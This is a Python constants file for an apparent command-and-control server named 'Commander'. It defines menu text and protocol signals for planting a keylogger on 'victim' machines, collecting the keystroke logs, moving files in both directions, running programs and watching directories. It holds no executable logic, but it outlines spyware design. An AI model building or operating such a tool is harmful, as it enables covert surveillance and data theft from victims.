ZERO = 0
MIN_PORT_RANGE = 0
MAX_PORT_RANGE = 65536
LOCAL_HOST = "localhost"
LOCAL_HOST_VALUE = "127.0.0.1"
MIN_QUEUE_SIZE = 5
CLIENT_LIST_INITIAL_SIZE = 1
NEW_CONNECTION_MSG = "[+] NOTICE: There is a new client that has connected ({})"

# MENU Constants
OPENING_BANNER = "===================================== || COMMANDER PROGRAM || ====================================="
MENU_CLOSING_BANNER = ("==================================================================================="
                       "===============")
SERVER_INFO_MSG = "[+] Commander server is listening on (IP: {} Port: {})"
INVALID_INPUT_MENU_ERROR = "[+] ERROR: Invalid input was provided to menu: {}"
INITIAL_VICTIM_IP_MSG = "[+] Victim IP (from argument): {}"
INITIAL_VICTIM_PORT_MSG = "[+] Victim Port (from argument): {}"
INITIATE_VICTIM_CONNECTION_MSG = "[+] Now initiating a connection to the victim..."
SUCCESSFUL_VICTIM_CONNECTION_MSG = "[+] Successfully connected to a victim: {}"
ERROR_VICTIM_CONNECTION_MSG = "[+] ERROR: A connection error to victim has occurred: {}"
MENU_SELECTION_PROMPT_MSG = "[+] Enter any number above to perform any of the following actions displayed: "
INVALID_MENU_SELECTION_PROMPT = "\n[+] INVALID INPUT: Please enter a valid option: "
COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG = "[+] ERROR: An error has occurred while creating server socket: {}"
MENU_ITEM_ONE = "1 - Start Keylogger"
MENU_ITEM_TWO = "2 - Stop Keylogger"
MENU_ITEM_THREE = "3 - Transfer Keylog Program to Victim"
MENU_ITEM_FOUR = "4 - Get Keylog File from Victim"
MENU_ITEM_FIVE = "5 - Disconnect from Victim"
MENU_ITEM_SIX = "6 - Transfer a file to a Victim"
MENU_ITEM_SEVEN = "7 - Get a file from a Victim"
MENU_ITEM_EIGHT = "8 - Run program"
MENU_ITEM_NINE = "9 - Watch file"
MENU_ITEM_TEN = "10 - Watch directory"
MENU_ITEM_ELEVEN = "11 - Get List of All Connected Victim(s)"
MENU_ITEM_TWELVE = "12 - Connect to a Specific Victim"
MENU_ITEM_THIRTEEN = "13 - Uninstall"
PERFORM_MENU_ITEM_ONE = 1
PERFORM_MENU_ITEM_TWO = 2
PERFORM_MENU_ITEM_THREE = 3
PERFORM_MENU_ITEM_FOUR = 4
PERFORM_MENU_ITEM_FIVE = 5
PERFORM_MENU_ITEM_SIX = 6
PERFORM_MENU_ITEM_SEVEN = 7
PERFORM_MENU_ITEM_EIGHT = 8
PERFORM_MENU_ITEM_NINE = 9
PERFORM_MENU_ITEM_TEN = 10
PERFORM_MENU_ITEM_ELEVEN = 11
PERFORM_MENU_ITEM_TWELVE = 12
PERFORM_MENU_ITEM_THIRTEEN = 13
MIN_MENU_ITEM_VALUE = 1
MAX_MENU_ITEM_VALUE = 13
BYTE_LIMIT = 1024
MIN_BUFFER_SIZE = 200
MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
RETURN_MAIN_MENU_MSG = "[+] Now returning to main menu..."
DOWNLOADS_DIR = "downloads"

# GENERAL CONSTANTS
CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
                           "menu item 12)")
CLIENT_RESPONSE = "[+] Client says: {}"

# MENU ITEM 1 - Start Keylogger constants
START_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 1] - Now starting keylogger on the client/victim side..."
START_SEND_SIGNAL_MSG = ("[+] SENDING SIGNAL: Sending a signal to get client/victim to check if they have {}"
                         " installed... ({}, {})")
START_SIGNAL_RECEIVED_MSG = "[+] SIGNAL RECEIVED: Client/victim is now checking if {} is installed on their machine..."
START_SIGNAL_SEND_FILE_NAME = "[+] SENDING DATA: Now sending file name {} to victim/client..."
AWAIT_START_RESPONSE_MSG = "[+] Awaiting response..."
START_KEYLOG_MSG = "START"
CHECK_KEYLOG = "CHECK"
KEYLOG_FILE_CHECK_ERROR = "[+] ERROR: An error has occurred while checking if client/victim has {} : {}"
STATUS_TRUE = "TRUE"
STATUS_FALSE = "FALSE"
START_SIGNAL_EXECUTE_KEYLOG = "[+] SENDING SIGNAL: Sending a signal to client/victim to execute {}"
MISSING_KEYLOG_FILE_SUGGEST_MSG = ("[+] TIP: Enter the number 3 to initiate a transfer of the keylog "
                                   "file to client/victim")
KEYLOG_OPERATION_SUCCESSFUL = "[+] OPERATION SUCCESSFUL: Keylog file saved on client/victim device!"
KEYLOG_ERROR_MSG = "[+] ERROR: An error has occurred during the execution of keylogger: {}"
KEYLOG_STATUS_TRUE_ERROR = "[+] This specific client (IP: {}, Port: {}) is already running the keylogger program!"
KEYLOG_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop the keylogger for this specific client using menu item 2"
STOP_KEYLOG_SUGGESTION_MSG = ("[+] TIP: To save and record keystrokes for this client (IP: {}, Port: {}), select "
                              "menu item 2 (Stop Keylogger) after return to main menu")
ENTER_TARGET_IP_START_KEYLOG = "[+] Enter victim IP address to start keylogger program on: "
ENTER_TARGET_PORT_START_KEYLOG = "[+] Enter victim port to start keylogger program on: "

# MENU ITEM 2 - Stop Keylogger constants
STOP_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 2] - Now stopping keylogger on the client/victim side..."
STOP_KEYLOGGER_MENU_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
                              "on victim/client")
STOP_KEYWORD = "STOP"
STOP_KEYLOGGER_PROMPT = "[+] Enter the number 2 to 'Stop Keylogger': "
INVALID_INPUT_STOP_KEYLOGGER = "[+] INVALID INPUT: Please try again: "
STOP_KEYLOG_RESULT_ERROR = "[+] ERROR: An error has occurred during the keylogging process : {}"
STOP_KEYLOG_STATUS_FALSE = ("[+] STOP KEYLOG ERROR: Cannot stop keylogger for this specific client (IP: {}, "
                            "Port: {}) as they're currently not running the keylogger program!")
ENTER_TARGET_IP_STOP_KEYLOG = "[+] Enter victim IP address to stop keylogger program on: "
ENTER_TARGET_PORT_STOP_KEYLOG = "[+] Enter victim port to stop keylogger program on: "

# MENU ITEM 5 - DISCONNECT Constants
DISCONNECT_FROM_VICTIM_MSG = "[+] DISCONNECTING FROM VICTIM: Now disconnecting from victim {}..."
DISCONNECT_FROM_VICTIM_SUCCESS = "[+] DISCONNECT SUCCESSFUL: Disconnection was successful!"
DISCONNECT_FROM_VICTIM_ERROR = "[+] DISCONNECT ERROR: There is no such client/victim to disconnect from!"
ENTER_TARGET_IP_DISCONNECT_PROMPT = "[+] Enter victim IP address to disconnect from: "
ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from: "
DISCONNECT_ERROR_KEYLOG_TRUE = ("[+] DISCONNECT ERROR: Cannot disconnect from the following client (IP: {}, Port: {}) "
                                " as they're currently running a keylogger program!")

# MENU ITEM 3 - TRANSFER KEYLOG Constants
KEYLOG_FILE_NAME = "keylogger.py"
TRANSFER_KEYLOG_MSG = "GET KEYLOG"
RECEIVED_CONFIRMATION_MSG = "OK"
FILE_NAME_TRANSFER_MSG = "[+] Sending file: {}"
FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
END_OF_FILE_SIGNAL = b"END_OF_FILE"
VICTIM_ACK = "ACK"
TARGET_VICTIM_NOT_FOUND = "[+] ERROR: Target victim not found!"
ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer keylog program to: "
ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer keylog program to: "
FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
                                            "connected to any clients")
FILE_TRANSFER_KEYLOG_TRUE_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer keylog program to the following client ("
                                   "IP: {}, Port: {}) as they're currently running a keylogger program!")

# MENU ITEM 4 - GET KEYLOG FILE(S) FROM CLIENT/VICTIM Constants
TRANSFER_KEYLOG_FILE_SIGNAL = "TRANSFER FILE"
GET_KEYLOG_FILE_NO_CLIENTS_ERROR = "[+] GET_KEYLOG_FILE_ERROR: The command server is not connected to any clients"
GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR = (
    "[+] GET_KEYLOG_FILE_ERROR: Cannot get recorded keylog file(s) from the following client (IP: {}, Port: {}) as "
    "they're currently running a keylogger program!")
SEND_GET_KEYLOG_SIGNAL_PROMPT = ("[+] SENDING SIGNAL: Sending signal to client/victim to "
                                 "transfer recorded keylog files...")
GET_KEYLOG_PROCESS_MSG = ("[+] SEARCHING CLIENT: Now searching client/victim (IP: {}, Port: {}) "
                          "for any potentially recorded keylog '.txt' files...")
CREATE_DOWNLOAD_DIRECTORY_PROMPT = "[+] CREATING DIRECTORY: Now creating the following directory: {}"
DIRECTORY_SUCCESS_MSG = "[+] OPERATION SUCCESS: The directory has been successfully created!"
READ_MODE = "r"
FILE_CANNOT_OPEN_ERROR = "[+] ERROR: An error has occurred while opening {} : {}"
FILE_CANNOT_OPEN_TO_SENDER = "File has been received, but is either corrupted or not present"
RECEIVING_FILE_MSG = "[+] Receiving file: {}"
WRITE_BINARY_MODE = "wb"
TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
ENTER_TARGET_IP_GET_FILES = "[+] Enter the target (victim) IP address to receive recorded keylog files from: "
ENTER_TARGET_PORT_GET_FILES = "[+] Enter the target (victim) port to receive recorded keylog files from: "


# MENU ITEM 12 - Connect to a specific victim
INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"

# DESTINATION IP/PORT Constants
NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
INVALID_DST_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the destination IP address was provided "
                                    "(-d option): {}")
INVALID_FORMAT_DST_PORT_NUMBER_ARG_ERROR = "[+] ERROR: Invalid format provided for the destination port (-p option): {}"
INVALID_DST_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for destination port (-p option) is not "
                                 "valid: (not between 0 and 65536)")
NO_DST_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No destination IP Address (-d option) was specified!"
NO_DST_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No destination port number (-p option) was specified!"

# SOURCE IP/PORT Constants
INVALID_SRC_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the source IP address was provided "
                                    "(-s or --src_ip option): {}")
INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR = ("[+] ERROR: Invalid format provided for the source port (-c or --src_port "
                                            "option): {}")
INVALID_SRC_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for source port (-c or --src_port option) is not "
                                 "valid: (not between 0 and 65536)")
NO_SRC_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No source IP Address (-s or --src_ip option) was specified!"
NO_SRC_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No source port number (-c or --src_port option) was specified!"
